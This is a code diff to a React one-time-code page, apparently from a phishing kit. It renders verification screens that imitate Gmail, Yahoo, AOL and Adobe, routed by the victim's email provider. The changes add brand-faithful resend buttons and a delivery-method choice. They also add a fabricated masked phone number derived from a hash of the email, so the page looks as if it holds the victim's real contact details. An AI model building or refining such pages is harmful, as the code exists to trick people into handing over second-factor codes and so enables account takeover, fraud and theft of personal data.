@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import Spinner from './common/Spinner';
 import OtpInput from './common/OtpInput';
 
@@ -8,6 +8,7 @@ interface OtpPageProps {
   errorMessage?: string;
   email?: string;
   provider?: string;
+  onResend?: () => void;
 }
 
 const AdobeLogo = () => (
@@ -17,6 +18,33 @@ const AdobeLogo = () => (
     <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
   </svg>
 );
+
+const maskEmail = (email: string) => {
+  const [user, domain] = email.split('@');
+  if (!domain) return email;
+  const visible = user.length <= 2 ? user[0] : user.slice(0, 2);
+  return `${visible}${'*'.repeat(Math.max(user.length - 2, 1))}@${domain}`;
+};
+
+const maskPhone = (seedEmail: string) => {
+  const hash = Array.from(seedEmail).reduce((acc, c) => acc + c.charCodeAt(0), 0);
+  const last4 = String(hash).slice(-4).padStart(4, '0');
+  return `(•••) •••-${last4}`;
+};
+
+const UserAvatar: React.FC<{ email: string; size?: number }> = ({ email, size = 40 }) => {
+  const initial = email.charAt(0).toUpperCase();
+  const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853', '#720e9e', '#39007E', '#FF6D01', '#46BDC6'];
+  const colorIndex = Array.from(email).reduce((acc, c) => acc + c.charCodeAt(0), 0) % colors.length;
+  return (
+    <div
+      className="rounded-full flex items-center justify-center font-bold text-white flex-shrink-0"
+      style={{ width: size, height: size, backgroundColor: colors[colorIndex], fontSize: size * 0.45 }}
+    >
+      {initial}
+    </div>
+  );
+};
 
 /* ── Gmail / Google-style OTP ─────────────────────────────────── */
 const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
@@ -80,106 +108,194 @@ const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
 );
 
 /* ── Yahoo-style OTP ──────────────────────────────────────────── */
-const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
-  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
-    <div className="w-full max-w-md">
-      <div className="text-center mb-6">
-        <svg viewBox="0 0 120 40" className="mx-auto h-10 mb-6">
-          <text x="0" y="32" fill="#720e9e" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Yahoo</text>
-        </svg>
-      </div>
+const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
+  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
+  const [resendSent, setResendSent] = useState(false);
+  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
-      <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
-        <h1 className="text-xl font-bold text-gray-900 mb-2">Verify your identity</h1>
-        <p className="text-sm text-gray-600 mb-1">Enter the verification code sent to:</p>
-        {email && <p className="text-sm font-semibold text-gray-900 mb-6">{email}</p>}
+  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
 
-        <form onSubmit={onSubmit} className="space-y-6">
-          {errorMessage && (
-            <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
-              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
-              <span>{errorMessage}</span>
+  const handleResend = () => {
+    if (onResend) {
+      onResend();
+      setResendSent(true);
+      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
+      <div className="w-full max-w-md">
+        <div className="text-center mb-6">
+          <svg viewBox="0 0 120 40" className="mx-auto h-10 mb-6">
+            <text x="0" y="32" fill="#720e9e" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Yahoo</text>
+          </svg>
+        </div>
+
+        <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
+          <h1 className="text-xl font-bold text-gray-900 mb-4">Verify your identity</h1>
+
+          {email && (
+            <div className="flex items-center gap-3 mb-5">
+              <UserAvatar email={email} size={36} />
+              <span className="text-sm font-semibold text-gray-900">{email}</span>
             </div>
           )}
 
-          <div>
-            <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-            <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+          <p className="text-sm text-gray-600 mb-3">Where should we send your verification code?</p>
+
+          <div className="space-y-2 mb-6">
+            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'email' ? '#720e9e' : '#e5e7eb', backgroundColor: deliveryMethod === 'email' ? 'rgba(114,14,158,0.04)' : 'transparent' }}>
+              <input type="radio" name="delivery" checked={deliveryMethod === 'email'} onChange={() => setDeliveryMethod('email')} className="accent-[#720e9e]" />
+              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
+              <div>
+                <p className="text-sm font-medium text-gray-900">Email</p>
+                <p className="text-xs text-gray-500">{email ? maskEmail(email) : 'Email address on file'}</p>
+              </div>
+            </label>
+            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'phone' ? '#720e9e' : '#e5e7eb', backgroundColor: deliveryMethod === 'phone' ? 'rgba(114,14,158,0.04)' : 'transparent' }}>
+              <input type="radio" name="delivery" checked={deliveryMethod === 'phone'} onChange={() => setDeliveryMethod('phone')} className="accent-[#720e9e]" />
+              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
+              <div>
+                <p className="text-sm font-medium text-gray-900">Phone number</p>
+                <p className="text-xs text-gray-500">{email ? maskPhone(email) : 'Phone number on file'}</p>
+              </div>
+            </label>
           </div>
 
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#720e9e] hover:bg-[#5b0b7e] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
-            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-            {isLoading ? 'Verifying...' : 'Verify'}
-          </button>
-        </form>
+          <form onSubmit={onSubmit} className="space-y-6">
+            {errorMessage && (
+              <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
+                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
+                <span>{errorMessage}</span>
+              </div>
+            )}
 
-        <div className="mt-6 text-center">
-          <button type="button" className="text-sm font-medium hover:underline" style={{ color: '#720e9e' }}>Resend code</button>
-        </div>
-      </div>
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
+              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+            </div>
 
-      <div className="mt-6 text-center text-xs text-gray-500">
-        <div className="flex items-center justify-center gap-3">
-          <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
-          <span className="text-gray-300">|</span>
-          <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
+            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#720e9e] hover:bg-[#5b0b7e] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Verify'}
+            </button>
+          </form>
+
+          <div className="mt-6 text-center">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm font-medium hover:underline disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#720e9e' }}>
+              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
+            </button>
+          </div>
         </div>
-        <p className="mt-2 text-gray-400">© 2026 Yahoo. All rights reserved.</p>
+
+        <div className="mt-6 text-center text-xs text-gray-500">
+          <div className="flex items-center justify-center gap-3">
+            <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
+            <span className="text-gray-300">|</span>
+            <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
+          </div>
+          <p className="mt-2 text-gray-400">© 2026 Yahoo. All rights reserved.</p>
+        </div>
       </div>
     </div>
-  </div>
-);
+  );
+};
 
 /* ── AOL-style OTP ────────────────────────────────────────────── */
-const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
-  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
-    <div className="w-full max-w-md">
-      <div className="text-center mb-6">
-        <svg viewBox="0 0 80 40" className="mx-auto h-10 mb-6">
-          <text x="0" y="32" fill="#39007E" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Aol</text>
-        </svg>
-      </div>
+const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
+  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
+  const [resendSent, setResendSent] = useState(false);
+  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
-      <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
-        <h1 className="text-xl font-bold text-gray-900 mb-2">Verify your identity</h1>
-        <p className="text-sm text-gray-600 mb-1">Enter the verification code sent to:</p>
-        {email && <p className="text-sm font-semibold text-gray-900 mb-6">{email}</p>}
+  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
 
-        <form onSubmit={onSubmit} className="space-y-6">
-          {errorMessage && (
-            <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
-              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
-              <span>{errorMessage}</span>
+  const handleResend = () => {
+    if (onResend) {
+      onResend();
+      setResendSent(true);
+      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
+      <div className="w-full max-w-md">
+        <div className="text-center mb-6">
+          <svg viewBox="0 0 80 40" className="mx-auto h-10 mb-6">
+            <text x="0" y="32" fill="#39007E" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Aol</text>
+          </svg>
+        </div>
+
+        <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
+          <h1 className="text-xl font-bold text-gray-900 mb-4">Verify your identity</h1>
+
+          {email && (
+            <div className="flex items-center gap-3 mb-5">
+              <UserAvatar email={email} size={36} />
+              <span className="text-sm font-semibold text-gray-900">{email}</span>
             </div>
           )}
 
-          <div>
-            <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-            <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+          <p className="text-sm text-gray-600 mb-3">Where should we send your verification code?</p>
+
+          <div className="space-y-2 mb-6">
+            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'email' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'email' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
+              <input type="radio" name="delivery" checked={deliveryMethod === 'email'} onChange={() => setDeliveryMethod('email')} className="accent-[#39007E]" />
+              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
+              <div>
+                <p className="text-sm font-medium text-gray-900">Email</p>
+                <p className="text-xs text-gray-500">{email ? maskEmail(email) : 'Email address on file'}</p>
+              </div>
+            </label>
+            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'phone' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'phone' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
+              <input type="radio" name="delivery" checked={deliveryMethod === 'phone'} onChange={() => setDeliveryMethod('phone')} className="accent-[#39007E]" />
+              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
+              <div>
+                <p className="text-sm font-medium text-gray-900">Phone number</p>
+                <p className="text-xs text-gray-500">{email ? maskPhone(email) : 'Phone number on file'}</p>
+              </div>
+            </label>
           </div>
 
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
-            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-            {isLoading ? 'Verifying...' : 'Verify'}
-          </button>
-        </form>
+          <form onSubmit={onSubmit} className="space-y-6">
+            {errorMessage && (
+              <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
+                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
+                <span>{errorMessage}</span>
+              </div>
+            )}
 
-        <div className="mt-6 text-center">
-          <button type="button" className="text-sm font-medium hover:underline" style={{ color: '#39007E' }}>Resend code</button>
-        </div>
-      </div>
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
+              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+            </div>
 
-      <div className="mt-6 text-center text-xs text-gray-500">
-        <div className="flex items-center justify-center gap-3">
-          <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
-          <span className="text-gray-300">|</span>
-          <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
+            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Verify'}
+            </button>
+          </form>
+
+          <div className="mt-6 text-center">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm font-medium hover:underline disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#39007E' }}>
+              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
+            </button>
+          </div>
         </div>
-        <p className="mt-2 text-gray-400">© 2026 Aol. All rights reserved.</p>
+
+        <div className="mt-6 text-center text-xs text-gray-500">
+          <div className="flex items-center justify-center gap-3">
+            <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
+            <span className="text-gray-300">|</span>
+            <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
+          </div>
+          <p className="mt-2 text-gray-400">© 2026 Aol. All rights reserved.</p>
+        </div>
       </div>
     </div>
-  </div>
-);
+  );
+};
 
 /* ── Default / Others / Adobe-style OTP ───────────────────────── */
 const DefaultOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
@@ -240,7 +356,7 @@ const DefaultOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: b
 );
 
 /* ── Main OTP Page (routes to the right provider theme) ──────── */
-const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider }) => {
+const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend }) => {
   const [otp, setOtp] = useState('');
 
   const handleOtpComplete = (completedOtp: string) => {
@@ -260,9 +376,9 @@ const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, em
     case 'Gmail':
       return <GmailOtp {...sharedProps} />;
     case 'Yahoo':
-      return <YahooOtp {...sharedProps} />;
+      return <YahooOtp {...sharedProps} onResend={onResend} />;
     case 'AOL':
-      return <AolOtp {...sharedProps} />;
+      return <AolOtp {...sharedProps} onResend={onResend} />;
     default:
       return <DefaultOtp {...sharedProps} />;
   }
